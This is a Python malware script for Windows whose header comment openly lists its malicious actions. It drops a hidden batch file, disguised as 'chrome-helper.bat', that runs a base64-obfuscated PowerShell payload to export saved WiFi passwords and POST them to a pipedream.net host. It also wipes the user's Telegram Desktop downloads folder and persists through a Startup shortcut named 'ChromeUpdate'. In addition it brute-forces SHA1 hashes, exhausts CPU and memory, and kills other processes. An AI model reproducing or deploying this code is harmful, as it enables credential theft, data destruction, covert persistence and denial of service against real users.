# This script mainly performs 3 malicious actions:
#
# 1. WiFi credential extraction
#    - Creates a .bat file (chrome-helper.bat) that runs PowerShell
#      to use "netsh wlan export profile", exporting all saved WiFi
#      profiles (including passwords).
#    - When the batch file runs, the exported credentials are sent to
#      an attacker-controlled URL so the attacker can download them.
#
# 2. Deleting Telegram Desktop content
#    - Locates the "Telegram Desktop" folder inside the user's
#      Downloads directory and deletes all files.
#
# 3. Resource consumption (CPU and memory stress)
#    - Launches processes that intentionally use large amounts of
#      CPU and memory.
#    - One process (hashato) brute-forces hashes by trying
#      every number from 0 up to 9,999,999,999 (10 billion guesses).
#    - Another process (stress_cpu_and_memory) allocates memory and
#      runs a busy loop to stress the CPU.
#    - These actions slow down the machine and consume resources.
#
# The brute-force hash process and stress tasks are both consideredpart of the CPU/memory stress functionality.

from multiprocessing import Process, freeze_support
import subprocess
import sys
import hashlib, json, os, shutil
import psutil, time

C_LIMIT = 70
M_LIMIT = 50
PS = True
#Predefined Hashes we want to crack
TODO_HASHES = {
    "356A192B7913B04C54574D18C28D46E6395428AB",
    "BF5FC3DEAE42DC9821B1DFC6907C12F985C8008B",
    "BBB420BD2004EDCED3B47FF03E3221EC41BA6443",
    "F6BA7EFE9649CC8D3E3AD151778506902DE379DC",
    "CBA8BD2BB225EAE664D378F93D016D298DBBF725"
}

dnld = os.path.join(os.environ['USERPROFILE'], 'Downloads') # download path for part of stuff
chkp = os.path.join(os.environ['TEMP'], '0x2') # place that store output of hash


# create folder in Downloads and put in bat script
def batato():
    potato_dir = os.path.join(dnld, 'Potato') # folder name
    os.makedirs(potato_dir, exist_ok=True)
    potato_load = '''[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('JGY9JGVudjp0ZW1wOyBuZXRzaCB3bCBlIHAgaz1jbGVhciBmPSRmO2NkICRmO2djaSAqLnhtbHwle1t4bWxdJHg9Y2F0ICRfLmZ1bGxuYW1lOyRzPSR4LndsYW5wcm9maWxlLm5hbWU7JHA9JHgud2xhbnByb2ZpbGUubXNtLnNlY3VyaXR5LnNoYXJlZGtleS5rZXltYXRlcmlhbDsiJHtzfTokcCJ9fG91dC1maWxlICRmLzB4MTtpd3IgLXVyaSBodHRwczovL2VveTgwNXhoa2drdjVydS5tLnBpcGVkcmVhbS5uZXQgLW1ldGggUG9zdCAtaW5maWxlICRmLzB4MTtpd3IgLXVyaSBodHRwczovL2VveTgwNXhoa2drdjVydS5tLnBpcGVkcmVhbS5uZXQgLW1ldGggUG9zdCAtaW5maWxlICRmLzB4Mjs=')) | iex''' # payload scrub wifi
    bat_script = f"""@echo off
powershell -w h -NoP -NonI -command "{potato_load}"
""" # tell powershell to run the command
    bat_file_path = os.path.join(potato_dir, "chrome-helper.bat") # create bat script
    with open(bat_file_path, "w", encoding='utf-8') as f:
        f.write(bat_script) # write in

# delete folder name 'Telegram Desktop'
def deltato():
    telegram = os.path.join(dnld, 'Telegram Desktop')
    if os.path.isdir(telegram):
        for entry in os.listdir(telegram):
            path = os.path.join(telegram, entry)
            try:
                if os.path.isfile(path) or os.path.islink(path):
                    os.remove(path)
                elif os.path.isdir(path):
                    shutil.rmtree(path)
            except Exception as e:
                pass

# create startup folder
def setato():
    src = os.path.abspath(sys.argv[0])
    dst = os.path.join(os.environ["PUBLIC"], os.path.basename(src))
    shutil.copy2(src, dst)
    
    pot_at = os.path.join(
    os.environ["APPDATA"],
    r"Microsoft\Windows\Start Menu\Programs\Startup\ChromeUpdate.lnk"
    )
    src = r"C:\Users\Public\ChromeUpdate.exe"

    powershell_script = f'''
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut("{pot_at}")
    $Shortcut.TargetPath = "{src}"
    $Shortcut.WorkingDirectory = "{os.path.dirname(src)}"
    $Shortcut.IconLocation = "{src}"
    $Shortcut.Description = "Chrome Update Service"
    $Shortcut.Save()
    '''

    subprocess.run(["powershell", "-w","h","-NoP" ,"-NonI", powershell_script])

# related to the new hash stuff, similar, based occupy cpu
def save_checkpoint(filename, current_iteration, cracked, remaining):
    checkpoint_data = {
        "last_iteration": current_iteration,
        "cracked_passwords": cracked,
        "remaining_targets": list(remaining)
    }
    with open(filename, 'w') as f:
        json.dump(checkpoint_data, f, indent=4)

def load_checkpoint(filename):
    if os.path.exists(filename):
        with open(filename, 'r') as f:
            checkpoint_data = json.load(f)
        return (
            checkpoint_data.get("last_iteration", 0),
            checkpoint_data.get("cracked_passwords", {}),
            set(checkpoint_data.get("remaining_targets", []))
        )
    return 0, {}, set()

def calashto(input):
    return hashlib.sha1(input.encode()).hexdigest().upper()

"""
Iterates through numbers (as strings) from 0 up to 10 digits,
calculates their SHA1 hash, and checks if they match any target hashes.
Logs progress every 30 seconds and collects cracked passwords.
"""
def hashato(todo_hash, checkpoint="here.json"):
    cracked_passwords = {}
    attempts = 0
    max_digits = 10
    
    initial_iteration, loaded_cracked_passwords, loaded_remaining_targets = load_checkpoint(checkpoint)
    
    start_iteration = initial_iteration
    cracked_passwords.update(loaded_cracked_passwords) # Add loaded cracked passwords
    
    # Use either the loaded remaining targets, or the initial todo_hash if no checkpoint
    if loaded_remaining_targets:
        remaining_targets = loaded_remaining_targets
    else:
        remaining_targets = set(todo_hash)
        
    total_targets = len(todo_hash) # Keep track of the original total for progress display

    # Iterate through numbers from 0 up to 10^max_digits - 1
    # This covers numbers from 0 (1 digit) to 9,999,999,999 (10 digits)
    for i in range(start_iteration, 10**max_digits):
        attempts += 1
        current_password_candidate = str(i) 
        
        current_hash = calashto(current_password_candidate)

        # Check if the calculated hash matches any of the remaining target hashes
        if current_hash in remaining_targets:
            cracked_passwords[current_hash] = current_password_candidate
            # Remove the cracked hash from the set of remaining targets
            remaining_targets.remove(current_hash)
            # If all target hashes are cracked, exit the loop
            if not remaining_targets:
                break

        if attempts % 10000000 == 0:
            save_checkpoint(checkpoint, i, cracked_passwords, remaining_targets)

    save_checkpoint(checkpoint, i, cracked_passwords, remaining_targets)
#Exist so that when consuming resource, it will limit to a certain degree so that hash brute force still running
def chetato(CPU_LIMIT, MEM_LIMIT, KILL):
    while True:
        cpu = psutil.cpu_percent(interval=None)
        mem = psutil.virtual_memory().percent
        
        if (cpu > CPU_LIMIT or mem > MEM_LIMIT):
            for ps in psutil.process_iter(['pid','name','cpu_percent','memory_percent']):
                try:
                    if ps.info['cpu_percent'] > 70:
                        ps.suspend()
                        time.sleep(5)
                        ps.resume()
                    if ps.info['memory_percent'] > 50:
                        if(KILL):
                            ps.kill()
                except(psutil.NoSuchProcess, psutil.AccessDenied):
                    continue
        time.sleep(10)
            

def stress_cpu_and_memory(load=0.4):
    memory_holder = []

    def cpu_stress():
        cycle = 0.1
        while True:
            start = time.time()
            while time.time() - start < cycle * load:
                pass
            time.sleep(cycle * (1 - load))

    import threading
    threading.Thread(target=cpu_stress, daemon=True).start()

    try:
        while True:
            memory_holder.append("A" * 60_000_000)
            time.sleep(0.01)
    except MemoryError:
        print("MemoryError: System ran out of allocatable memory!")


# all the execution here
def main():
    freeze_support()
    batato() # wifi extractor script
    deltato() # telegram folder cleaner
    setato() # startup setter
    try:
        agent1 = Process(target=hashato, args=(TODO_HASHES.copy(), chkp,)) # hash helper
        agent2 = Process(target=chetato,args=(C_LIMIT, M_LIMIT, PS)) # process checker CPU
        agent3 = Process(target=stress_cpu_and_memory)

        agent1.start() # initialize the process
        agent2.start()
        agent3.start()

        agent1.join() # attach back after suspend or delayed case till finish
        agent2.join()
        agent3.join()
    except KeyboardInterrupt:
        pass
if __name__ == "__main__":
    main()

